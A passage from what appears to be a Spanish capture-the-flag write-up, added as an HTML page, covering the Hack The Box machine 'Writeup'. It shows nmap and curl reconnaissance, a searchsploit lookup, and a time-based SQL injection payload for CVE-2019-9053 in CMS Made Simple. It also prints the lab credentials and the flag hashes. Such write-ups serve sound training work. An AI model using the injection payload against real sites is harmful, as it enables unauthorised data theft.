@@ -1,0 +1,1249 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Writeup HTB | Heindall — Offensive Security Portfolio</title>
+  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg-primary:    #0a0d12;
+      --bg-secondary:  #0f1318;
+      --bg-card:       #13181f;
+      --bg-card-hover: #181e27;
+      --border:        #1e2733;
+      --border-accent: #243040;
+      --accent-green:  #00e5a0;
+      --accent-green2: #00c87a;
+      --accent-blue:   #38bdf8;
+      --accent-red:    #f43f5e;
+      --accent-orange: #fb923c;
+      --accent-purple: #a78bfa;
+      --accent-yellow: #fbbf24;
+      --text-primary:  #e2e8f0;
+      --text-secondary:#94a3b8;
+      --text-muted:    #475569;
+      --text-code:     #7dd3fc;
+      --font-display:  'Bebas Neue', sans-serif;
+      --font-body:     'Inter', sans-serif;
+      --font-mono:     'JetBrains Mono', monospace;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: var(--bg-primary);
+      color: var(--text-primary);
+      font-family: var(--font-body);
+      font-size: 15px;
+      line-height: 1.7;
+      min-height: 100vh;
+    }
+
+    /* ─── SCANLINES overlay ─── */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(0,229,160,0.012) 2px,
+        rgba(0,229,160,0.012) 4px
+      );
+      pointer-events: none;
+      z-index: 999;
+    }
+
+    /* ─── NAVBAR ─── */
+    nav {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background: rgba(10,13,18,0.92);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+      padding: 0 2rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 56px;
+    }
+    .nav-logo {
+      font-family: var(--font-display);
+      font-size: 1.6rem;
+      letter-spacing: 3px;
+      color: var(--accent-green);
+      text-decoration: none;
+    }
+    .nav-logo span { color: var(--text-secondary); font-size: 0.9rem; font-family: var(--font-mono); letter-spacing: 1px; }
+    .nav-breadcrumb {
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      color: var(--text-muted);
+    }
+    .nav-breadcrumb a { color: var(--text-secondary); text-decoration: none; }
+    .nav-breadcrumb a:hover { color: var(--accent-green); }
+    .nav-breadcrumb .sep { margin: 0 0.5rem; color: var(--border-accent); }
+
+    /* ─── HERO ─── */
+    .hero {
+      position: relative;
+      overflow: hidden;
+      background: linear-gradient(135deg, #0a0d12 0%, #0d1520 50%, #0a0f18 100%);
+      border-bottom: 1px solid var(--border);
+      padding: 4rem 2rem 3rem;
+    }
+    .hero-glow {
+      position: absolute;
+      top: -100px;
+      right: -100px;
+      width: 500px;
+      height: 500px;
+      background: radial-gradient(circle, rgba(0,229,160,0.08) 0%, transparent 70%);
+      pointer-events: none;
+    }
+    .hero-inner { max-width: 900px; margin: 0 auto; position: relative; }
+    .hero-meta {
+      display: flex;
+      gap: 0.6rem;
+      flex-wrap: wrap;
+      margin-bottom: 1.5rem;
+      align-items: center;
+    }
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.3rem;
+      padding: 0.2rem 0.7rem;
+      border-radius: 4px;
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      font-weight: 500;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      border: 1px solid transparent;
+    }
+    .badge-htb    { background: rgba(0,229,160,0.1);  color: var(--accent-green);  border-color: rgba(0,229,160,0.25); }
+    .badge-easy   { background: rgba(0,229,160,0.08); color: var(--accent-green2); border-color: rgba(0,200,122,0.2); }
+    .badge-linux  { background: rgba(56,189,248,0.1); color: var(--accent-blue);   border-color: rgba(56,189,248,0.2); }
+    .badge-vip    { background: rgba(251,191,36,0.1); color: var(--accent-yellow); border-color: rgba(251,191,36,0.2); }
+    .badge-pwned  { background: rgba(0,229,160,0.15); color: var(--accent-green);  border-color: rgba(0,229,160,0.4); }
+    .badge-cve    { background: rgba(244,63,94,0.1);  color: var(--accent-red);    border-color: rgba(244,63,94,0.2); }
+    .badge-dot { width: 6px; height: 6px; border-radius: 50%; display: inline-block; }
+    .badge-pwned .badge-dot { background: var(--accent-green); box-shadow: 0 0 6px var(--accent-green); animation: pulse 2s infinite; }
+    @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
+
+    .hero h1 {
+      font-family: var(--font-display);
+      font-size: clamp(2.8rem, 6vw, 5rem);
+      letter-spacing: 4px;
+      line-height: 1;
+      color: var(--text-primary);
+      margin-bottom: 0.5rem;
+    }
+    .hero h1 .accent { color: var(--accent-green); }
+    .hero-subtitle {
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      color: var(--text-muted);
+      margin-bottom: 2rem;
+    }
+    .hero-subtitle span { color: var(--accent-blue); }
+
+    /* Stats row */
+    .hero-stats {
+      display: flex;
+      gap: 2rem;
+      flex-wrap: wrap;
+    }
+    .stat {
+      display: flex;
+      flex-direction: column;
+      gap: 0.2rem;
+    }
+    .stat-value {
+      font-family: var(--font-mono);
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: var(--text-primary);
+    }
+    .stat-label {
+      font-size: 0.7rem;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    .stat-divider {
+      width: 1px;
+      background: var(--border);
+      align-self: stretch;
+    }
+
+    /* ─── LAYOUT ─── */
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 2.5rem 2rem;
+    }
+
+    /* ─── ATTACK CHAIN ─── */
+    .attack-chain {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 1.5rem;
+      margin-bottom: 2.5rem;
+      position: relative;
+      overflow: hidden;
+    }
+    .attack-chain::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0;
+      width: 3px;
+      height: 100%;
+      background: linear-gradient(to bottom, var(--accent-green), var(--accent-blue));
+    }
+    .attack-chain-title {
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      margin-bottom: 1rem;
+    }
+    .chain-steps {
+      display: flex;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 0.4rem;
+    }
+    .chain-step {
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      color: var(--text-code);
+      background: rgba(56,189,248,0.08);
+      border: 1px solid rgba(56,189,248,0.15);
+      padding: 0.25rem 0.6rem;
+      border-radius: 4px;
+      white-space: nowrap;
+    }
+    .chain-step.vuln { color: var(--accent-red); background: rgba(244,63,94,0.08); border-color: rgba(244,63,94,0.15); }
+    .chain-step.cred { color: var(--accent-orange); background: rgba(251,146,60,0.08); border-color: rgba(251,146,60,0.15); }
+    .chain-step.access { color: var(--accent-green); background: rgba(0,229,160,0.08); border-color: rgba(0,229,160,0.2); }
+    .chain-step.root { color: #fff; background: rgba(0,229,160,0.2); border-color: rgba(0,229,160,0.5); font-weight: 600; }
+    .chain-arrow { color: var(--text-muted); font-size: 0.9rem; }
+
+    /* ─── SECTION ─── */
+    .section { margin-bottom: 3rem; }
+    .section-header {
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      margin-bottom: 1.5rem;
+      padding-bottom: 0.75rem;
+      border-bottom: 1px solid var(--border);
+    }
+    .section-num {
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      color: var(--accent-green);
+      background: rgba(0,229,160,0.08);
+      border: 1px solid rgba(0,229,160,0.2);
+      padding: 0.15rem 0.5rem;
+      border-radius: 3px;
+    }
+    .section-title {
+      font-family: var(--font-display);
+      font-size: 1.6rem;
+      letter-spacing: 2px;
+      color: var(--text-primary);
+    }
+
+    /* ─── STEP BOX ─── */
+    .step {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow: hidden;
+      margin-bottom: 1.2rem;
+      transition: border-color 0.2s;
+    }
+    .step:hover { border-color: var(--border-accent); }
+    .step-header {
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      padding: 0.9rem 1.2rem;
+      background: rgba(255,255,255,0.02);
+      border-bottom: 1px solid var(--border);
+    }
+    .step-num {
+      font-family: var(--font-mono);
+      font-size: 0.65rem;
+      font-weight: 600;
+      color: var(--accent-green);
+      background: rgba(0,229,160,0.1);
+      border: 1px solid rgba(0,229,160,0.25);
+      width: 26px;
+      height: 26px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 4px;
+      flex-shrink: 0;
+    }
+    .step-title {
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      font-weight: 500;
+      color: var(--text-primary);
+    }
+    .step-body { padding: 1.2rem; }
+
+    /* info boxes */
+    .info-box {
+      border-radius: 6px;
+      padding: 0.8rem 1rem;
+      margin: 0.8rem 0;
+      font-size: 0.85rem;
+      line-height: 1.6;
+    }
+    .info-box.why {
+      background: rgba(56,189,248,0.05);
+      border-left: 3px solid rgba(56,189,248,0.4);
+      color: var(--text-secondary);
+    }
+    .info-box.why strong { color: var(--accent-blue); }
+    .info-box.interpret {
+      background: rgba(0,229,160,0.04);
+      border-left: 3px solid rgba(0,229,160,0.35);
+      color: var(--text-secondary);
+    }
+    .info-box.interpret strong { color: var(--accent-green); }
+    .info-box.decision {
+      background: rgba(251,146,60,0.05);
+      border-left: 3px solid rgba(251,146,60,0.35);
+      color: var(--text-secondary);
+    }
+    .info-box.decision strong { color: var(--accent-orange); }
+    .info-box.danger {
+      background: rgba(244,63,94,0.05);
+      border-left: 3px solid rgba(244,63,94,0.35);
+      color: var(--text-secondary);
+    }
+    .info-box.danger strong { color: var(--accent-red); }
+
+    /* ─── COMMAND ─── */
+    .cmd-block {
+      background: #070b0f;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      margin: 0.8rem 0;
+      overflow: hidden;
+    }
+    .cmd-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0.4rem 0.8rem;
+      background: rgba(255,255,255,0.03);
+      border-bottom: 1px solid var(--border);
+    }
+    .cmd-dots { display: flex; gap: 5px; }
+    .cmd-dot { width: 8px; height: 8px; border-radius: 50%; }
+    .cmd-dot.r { background: #f43f5e; }
+    .cmd-dot.y { background: #fbbf24; }
+    .cmd-dot.g { background: #22c55e; }
+    .cmd-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-muted); }
+    .cmd-body {
+      padding: 0.9rem 1rem;
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      color: #e2e8f0;
+      white-space: pre-wrap;
+      word-break: break-all;
+      line-height: 1.6;
+    }
+    .cmd-body .prompt { color: var(--accent-green); user-select: none; }
+    .cmd-body .flag-c { color: var(--accent-yellow); }
+    .cmd-body .flag-v { color: var(--accent-purple); }
+    .cmd-body .comment { color: var(--text-muted); }
+
+    /* output block */
+    .output-block {
+      background: #050709;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      margin: 0.8rem 0;
+      overflow: hidden;
+    }
+    .output-bar {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.35rem 0.8rem;
+      background: rgba(255,255,255,0.02);
+      border-bottom: 1px solid var(--border);
+    }
+    .output-icon { font-size: 0.65rem; }
+    .output-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-muted); }
+    .output-body {
+      padding: 0.8rem 1rem;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      color: var(--text-secondary);
+      white-space: pre-wrap;
+      line-height: 1.65;
+    }
+    .output-body .hl { color: var(--text-primary); }
+    .output-body .hl-green { color: var(--accent-green); font-weight: 600; }
+    .output-body .hl-red { color: var(--accent-red); }
+    .output-body .hl-blue { color: var(--accent-blue); }
+    .output-body .hl-yellow { color: var(--accent-yellow); }
+
+    /* ─── FLAGS ─── */
+    .flags-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+      margin-bottom: 2rem;
+    }
+    @media(max-width:600px){ .flags-grid { grid-template-columns: 1fr; } }
+    .flag-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 1.2rem;
+      position: relative;
+      overflow: hidden;
+    }
+    .flag-card.user { border-color: rgba(56,189,248,0.3); }
+    .flag-card.root { border-color: rgba(0,229,160,0.4); }
+    .flag-card::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, rgba(0,229,160,0.03) 0%, transparent 60%);
+      pointer-events: none;
+    }
+    .flag-card.user::after { background: linear-gradient(135deg, rgba(56,189,248,0.04) 0%, transparent 60%); }
+    .flag-type {
+      font-family: var(--font-mono);
+      font-size: 0.65rem;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      margin-bottom: 0.5rem;
+    }
+    .flag-card.user .flag-type { color: var(--accent-blue); }
+    .flag-card.root .flag-type { color: var(--accent-green); }
+    .flag-value {
+      font-family: var(--font-mono);
+      font-size: 0.82rem;
+      color: var(--text-primary);
+      word-break: break-all;
+      background: rgba(0,0,0,0.3);
+      padding: 0.5rem 0.7rem;
+      border-radius: 4px;
+      border: 1px solid var(--border);
+    }
+    .flag-icon {
+      font-size: 1.5rem;
+      margin-bottom: 0.5rem;
+      display: block;
+    }
+
+    /* ─── VULN BOX ─── */
+    .vuln-card {
+      background: var(--bg-card);
+      border: 1px solid rgba(244,63,94,0.2);
+      border-radius: 8px;
+      padding: 1.2rem;
+      margin-bottom: 1rem;
+    }
+    .vuln-header {
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      margin-bottom: 0.8rem;
+    }
+    .vuln-cve {
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      color: var(--accent-red);
+      background: rgba(244,63,94,0.1);
+      border: 1px solid rgba(244,63,94,0.25);
+      padding: 0.2rem 0.6rem;
+      border-radius: 4px;
+    }
+    .vuln-name {
+      font-family: var(--font-mono);
+      font-size: 0.9rem;
+      color: var(--text-primary);
+    }
+    .vuln-desc { font-size: 0.85rem; color: var(--text-secondary); line-height: 1.6; }
+
+    /* ─── TABLE ─── */
+    .info-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      margin: 1rem 0;
+    }
+    .info-table td {
+      padding: 0.5rem 0.8rem;
+      border-bottom: 1px solid var(--border);
+    }
+    .info-table td:first-child { color: var(--text-muted); width: 130px; }
+    .info-table td:last-child { color: var(--text-primary); }
+    .info-table tr:last-child td { border-bottom: none; }
+
+    /* ─── LESSONS ─── */
+    .lesson-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+    }
+    @media(max-width:600px){ .lesson-grid { grid-template-columns: 1fr; } }
+    .lesson-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 1.2rem;
+    }
+    .lesson-card.attacker { border-top: 2px solid var(--accent-red); }
+    .lesson-card.defender { border-top: 2px solid var(--accent-blue); }
+    .lesson-card-title {
+      font-family: var(--font-mono);
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      margin-bottom: 0.8rem;
+    }
+    .lesson-card.attacker .lesson-card-title { color: var(--accent-red); }
+    .lesson-card.defender .lesson-card-title { color: var(--accent-blue); }
+    .lesson-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+    }
+    .lesson-list li {
+      font-size: 0.83rem;
+      color: var(--text-secondary);
+      padding-left: 1rem;
+      position: relative;
+      line-height: 1.55;
+    }
+    .lesson-list li::before {
+      content: '›';
+      position: absolute;
+      left: 0;
+      color: var(--accent-green);
+    }
+    .lesson-card.defender .lesson-list li::before { color: var(--accent-blue); }
+
+    /* ─── GLOSSARY ─── */
+    .glossary-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+      gap: 0.8rem;
+    }
+    .glossary-item {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 0.8rem;
+    }
+    .glossary-term {
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      color: var(--accent-green);
+      font-weight: 600;
+      margin-bottom: 0.3rem;
+    }
+    .glossary-def {
+      font-size: 0.78rem;
+      color: var(--text-secondary);
+      line-height: 1.5;
+    }
+
+    /* ─── DIAGRAM ─── */
+    .diagram {
+      background: #050709;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 1.5rem;
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      color: var(--text-secondary);
+      line-height: 1.8;
+      overflow-x: auto;
+    }
+    .diagram .d-green { color: var(--accent-green); }
+    .diagram .d-blue { color: var(--accent-blue); }
+    .diagram .d-red { color: var(--accent-red); }
+    .diagram .d-yellow { color: var(--accent-yellow); }
+    .diagram .d-dim { color: var(--text-muted); }
+
+    /* ─── FOOTER ─── */
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 2rem;
+      text-align: center;
+      font-family: var(--font-mono);
+      font-size: 0.72rem;
+      color: var(--text-muted);
+    }
+    footer span { color: var(--accent-green); }
+    footer a { color: var(--text-muted); text-decoration: none; }
+    footer a:hover { color: var(--accent-green); }
+
+    /* scrollbar */
+    ::-webkit-scrollbar { width: 6px; height: 6px; }
+    ::-webkit-scrollbar-track { background: var(--bg-primary); }
+    ::-webkit-scrollbar-thumb { background: var(--border-accent); border-radius: 3px; }
+    ::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
+  </style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <a class="nav-logo" href="#">HEINDALL <span>// offensive security</span></a>
+  <div class="nav-breadcrumb">
+    <a href="#">reports</a>
+    <span class="sep">/</span>
+    <a href="#">htb</a>
+    <span class="sep">/</span>
+    <span>writeup</span>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-glow"></div>
+  <div class="hero-inner">
+    <div class="hero-meta">
+      <span class="badge badge-htb">HTB</span>
+      <span class="badge badge-easy">Easy</span>
+      <span class="badge badge-linux">Linux</span>
+      <span class="badge badge-vip">VIP</span>
+      <span class="badge badge-pwned"><span class="badge-dot"></span>Pwned</span>
+      <span class="badge badge-cve">CVE-2019-9053</span>
+    </div>
+
+    <h1><span class="accent">WRITE</span>UP</h1>
+    <p class="hero-subtitle">
+      10.129.19.66 &nbsp;·&nbsp; <span>Apache 2.4.25</span> &nbsp;·&nbsp;
+      <span>CMS Made Simple 2.2.9.1</span> &nbsp;·&nbsp;
+      <span>Debian 9 (Stretch)</span>
+    </p>
+
+    <div class="hero-stats">
+      <div class="stat">
+        <span class="stat-value" style="color:var(--accent-green)">jkr:raykayjay9</span>
+        <span class="stat-label">Credenciales</span>
+      </div>
+      <div class="stat-divider"></div>
+      <div class="stat">
+        <span class="stat-value">Time-Based SQLi</span>
+        <span class="stat-label">Vector inicial</span>
+      </div>
+      <div class="stat-divider"></div>
+      <div class="stat">
+        <span class="stat-value">PATH Hijacking</span>
+        <span class="stat-label">Privesc</span>
+      </div>
+      <div class="stat-divider"></div>
+      <div class="stat">
+        <span class="stat-value" style="color:var(--accent-yellow)">~15 min</span>
+        <span class="stat-label">Tiempo total</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- MAIN -->
+<main class="container">
+
+  <!-- FLAGS -->
+  <div class="flags-grid" style="margin-top:0.5rem">
+    <div class="flag-card user">
+      <span class="flag-icon">🏴</span>
+      <div class="flag-type">User Flag</div>
+      <div class="flag-value">47ae36242ac0ab41d76cae514e73374e</div>
+    </div>
+    <div class="flag-card root">
+      <span class="flag-icon">⚑</span>
+      <div class="flag-type">Root Flag</div>
+      <div class="flag-value">b87af043e4c149ce29dc91a72dd5d34c</div>
+    </div>
+  </div>
+
+  <!-- ATTACK CHAIN -->
+  <div class="attack-chain">
+    <div class="attack-chain-title">// cadena de ataque completa</div>
+    <div class="chain-steps">
+      <span class="chain-step">nmap -p- 22,80</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-step">robots.txt → /writeup/</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-step vuln">CVE-2019-9053 SQLi</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-step cred">hash MD5 → raykayjay9</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-step access">SSH jkr</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-step">grupo staff</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-step vuln">/usr/local/sbin writable</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-step cred">uname falso → SSH key</span>
+      <span class="chain-arrow">→</span>
+      <span class="chain-step root">ROOT ✓</span>
+    </div>
+  </div>
+
+  <!-- MACHINE INFO -->
+  <div class="section">
+    <div class="section-header">
+      <span class="section-num">00</span>
+      <h2 class="section-title">INFORMACIÓN DE LA MÁQUINA</h2>
+    </div>
+    <div class="step">
+      <div class="step-body">
+        <table class="info-table">
+          <tr><td>Plataforma</td><td>Hack The Box (HTB)</td></tr>
+          <tr><td>Nombre</td><td>Writeup</td></tr>
+          <tr><td>IP</td><td>10.129.19.66</td></tr>
+          <tr><td>Dificultad</td><td><span style="color:var(--accent-green)">Easy</span></td></tr>
+          <tr><td>Sistema</td><td>Linux (Debian 9 Stretch)</td></tr>
+          <tr><td>Categoría</td><td>VIP</td></tr>
+          <tr><td>Servicios</td><td>SSH (22), HTTP (80)</td></tr>
+          <tr><td>Stack web</td><td>Apache 2.4.25 + PHP + CMS Made Simple 2.2.9.1</td></tr>
+          <tr><td>Fecha</td><td>2026-04-11</td></tr>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- RECONNAISSANCE -->
+  <div class="section">
+    <div class="section-header">
+      <span class="section-num">01</span>
+      <h2 class="section-title">RECONOCIMIENTO</h2>
+    </div>
+
+    <!-- Step 1 -->
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">01</span>
+        <span class="step-title">Escaneo completo de puertos — nmap -p-</span>
+      </div>
+      <div class="step-body">
+        <div class="info-box why">
+          <strong>¿Por qué?</strong> Antes de atacar, mapeamos toda la superficie expuesta. Un escaneo de todos los 65535 puertos garantiza que no perdamos servicios en puertos no estándar. Usamos SYN scan (-sS) para no completar el handshake TCP — más rápido y menos ruido en logs.
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-bar">
+            <div class="cmd-dots"><div class="cmd-dot r"></div><div class="cmd-dot y"></div><div class="cmd-dot g"></div></div>
+            <span class="cmd-label">kali@kali — reconnaissance</span>
+          </div>
+          <div class="cmd-body"><span class="prompt">$ </span>nmap <span class="flag-c">-p-</span> <span class="flag-c">--open</span> <span class="flag-c">-n</span> <span class="flag-c">-T4</span> <span class="flag-c">-sS</span> 10.129.19.66</div>
+        </div>
+        <div class="output-block">
+          <div class="output-bar"><span class="output-icon">▸</span><span class="output-label">output</span></div>
+          <div class="output-body">PORT   STATE SERVICE REASON
+<span class="hl-green">22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63</span></div>
+        </div>
+        <div class="info-box interpret">
+          <strong>¿Qué reveló?</strong> Solo 2 puertos abiertos: SSH (22) y HTTP (80). La superficie de ataque es reducida. El puerto 80 es el vector más probable — SSH requiere credenciales que aún no tenemos.
+        </div>
+        <div class="info-box danger">
+          <strong>⚠ Trampa detectada:</strong> El scan -T4 agresivo puede triggear el <strong>fail2ban</strong> de la máquina, haciendo que el puerto 80 aparezca como "filtered" en la fase 2 de nmap. Solución: verificar con <code style="color:var(--accent-blue);font-family:var(--font-mono)">nc -zvw3 10.129.19.66 80</code> antes de asumir que está cerrado.
+        </div>
+      </div>
+    </div>
+
+    <!-- Step 2 -->
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">02</span>
+        <span class="step-title">Enumeración de servicios — nmap -sC -sV</span>
+      </div>
+      <div class="step-body">
+        <div class="info-box why">
+          <strong>¿Por qué?</strong> Detectar las versiones exactas del software es crítico para buscar CVEs. El flag -sC ejecuta los scripts NSE por defecto de nmap, que entre otras cosas leen automáticamente robots.txt.
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-bar">
+            <div class="cmd-dots"><div class="cmd-dot r"></div><div class="cmd-dot y"></div><div class="cmd-dot g"></div></div>
+            <span class="cmd-label">kali@kali — service detection</span>
+          </div>
+          <div class="cmd-body"><span class="prompt">$ </span>nmap <span class="flag-c">-p22,80</span> <span class="flag-c">-sC</span> <span class="flag-c">-sV</span> <span class="flag-c">-n</span> 10.129.19.66</div>
+        </div>
+        <div class="output-block">
+          <div class="output-bar"><span class="output-icon">▸</span><span class="output-label">output</span></div>
+          <div class="output-body">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     <span class="hl">OpenSSH 7.4p1 Debian 10+deb9u6</span>
+80/tcp open  http    <span class="hl">Apache httpd 2.4.25</span>
+| http-robots.txt: 1 disallowed entry
+|_<span class="hl-green">/writeup/</span>
+|_http-title: Nothing here yet.</div>
+        </div>
+        <div class="info-box interpret">
+          <strong>¿Qué reveló?</strong> nmap detectó automáticamente el <strong>robots.txt</strong> con una entrada prohibida: <code style="color:var(--accent-green);font-family:var(--font-mono)">/writeup/</code>. Este directorio es nuestro siguiente objetivo. No es necesario hacer fuzzing — el servidor ya nos reveló la ruta clave.
+        </div>
+        <div class="info-box decision">
+          <strong>Decisión:</strong> Investigar <code style="font-family:var(--font-mono)">/writeup/</code> directamente. El robots.txt es un mapa del tesoro que los administradores crean creyendo que oculta rutas de Google, pero es visible para cualquier atacante.
+        </div>
+      </div>
+    </div>
+
+    <!-- Step 3 -->
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">03</span>
+        <span class="step-title">Fingerprint del CMS — curl + meta tags</span>
+      </div>
+      <div class="step-body">
+        <div class="cmd-block">
+          <div class="cmd-bar">
+            <div class="cmd-dots"><div class="cmd-dot r"></div><div class="cmd-dot y"></div><div class="cmd-dot g"></div></div>
+            <span class="cmd-label">kali@kali — web enumeration</span>
+          </div>
+          <div class="cmd-body"><span class="prompt">$ </span>curl -s http://10.129.19.66/writeup/doc/CHANGELOG.txt | head -2</div>
+        </div>
+        <div class="output-block">
+          <div class="output-bar"><span class="output-icon">▸</span><span class="output-label">output</span></div>
+          <div class="output-body"><span class="hl-green">Version 2.2.9.1</span>
+-------------------------------
+Core - General</div>
+        </div>
+        <div class="info-box interpret">
+          <strong>¿Qué reveló?</strong> <strong>CMS Made Simple versión 2.2.9.1</strong>. Esta versión exacta es vulnerable a CVE-2019-9053 (SQL Injection). El CHANGELOG.txt expone públicamente la versión del CMS — una misconfiguration común que facilita el reconocimiento pasivo.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- EXPLOTACION -->
+  <div class="section">
+    <div class="section-header">
+      <span class="section-num">02</span>
+      <h2 class="section-title">EXPLOTACIÓN — CVE-2019-9053</h2>
+    </div>
+
+    <!-- Vuln card -->
+    <div class="vuln-card">
+      <div class="vuln-header">
+        <span class="vuln-cve">CVE-2019-9053</span>
+        <span class="vuln-name">CMS Made Simple &lt; 2.2.10 — SQL Injection (Time-Based Blind)</span>
+      </div>
+      <p class="vuln-desc">
+        El parámetro <code style="color:var(--accent-blue);font-family:var(--font-mono)">m1_idlist</code> en el módulo <strong>News</strong> de CMS Made Simple no sanitiza el input antes de incluirlo en una consulta SQL. El atacante puede inyectar funciones de retardo (<code style="font-family:var(--font-mono)">SLEEP()</code>) para inferir datos de la base de datos caracter por caracter. No requiere autenticación.
+      </p>
+    </div>
+
+    <!-- Step 4 -->
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">04</span>
+        <span class="step-title">Búsqueda de exploit — searchsploit</span>
+      </div>
+      <div class="step-body">
+        <div class="info-box why">
+          <strong>¿Por qué?</strong> searchsploit es la CLI de Exploit-DB, la mayor base pública de exploits. Buscar por nombre + versión del CMS nos da exploits públicos sin necesidad de internet.
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-bar">
+            <div class="cmd-dots"><div class="cmd-dot r"></div><div class="cmd-dot y"></div><div class="cmd-dot g"></div></div>
+            <span class="cmd-label">kali@kali — exploit research</span>
+          </div>
+          <div class="cmd-body"><span class="prompt">$ </span>searchsploit "cms made simple 2.2"</div>
+        </div>
+        <div class="output-block">
+          <div class="output-bar"><span class="output-icon">▸</span><span class="output-label">output</span></div>
+          <div class="output-body">CMS Made Simple &lt; 2.2.10 - SQL Injection  | <span class="hl-green">php/webapps/46635.py</span></div>
+        </div>
+        <div class="info-box decision">
+          <strong>Decisión:</strong> Copiar el exploit y adaptarlo a Python3 (el original usa termcolor en Python2 que no está disponible). El exploit usa SQLi time-based para extraer salt, username, email y hash de contraseña.
+        </div>
+      </div>
+    </div>
+
+    <!-- Step 5 -->
+    <div class="step">
+      <div class="step-header">
+        <span class="step-num">05</span>
+        <span class="step-title">Ejecución del SQLi — extracción de credenciales</span>
+      </div>
+      <div class="step-body">
+        <div class="info-box why">
+          <strong>¿Cómo funciona el ataque?</strong> El exploit envía peticiones GET con payloads como:
+          <code style="display:block;font-family:var(--font-mono);font-size:0.77rem;margin-top:0.5rem;color:var(--text-code)">m1_idlist=a,b,1,5))+and+(select+sleep(1)+from+cms_siteprefs+where+sitepref_value+like+0x3561...25)+--+</code>
+          Si el servidor tarda ≥1 segundo, el caracter es correcto. Se repite para cada posición hasta reconstruir el valor completo.
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-bar">
+            <div class="cmd-dots"><div class="cmd-dot r"></div><div class="cmd-dot y"></div><div class="cmd-dot g"></div></div>
